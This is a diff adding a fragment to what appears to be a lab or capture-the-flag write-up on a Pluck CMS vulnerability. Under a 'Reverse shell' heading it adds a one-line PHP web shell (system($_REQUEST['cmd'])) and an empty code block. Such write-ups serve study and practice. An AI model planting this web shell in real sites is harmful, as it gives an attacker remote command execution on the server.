@@ -120,4 +120,12 @@ https://www.blackduck.com/blog/a-deep-dive-on-pluck-cms-vulnerability-cve-2023-2
 
 # Reverse shell
 
+```python
+cat shell.php                                             
+<?php system($_REQUEST['cmd']); ?>
+```
+Ill start by making the php file
 
+```python
+
+```
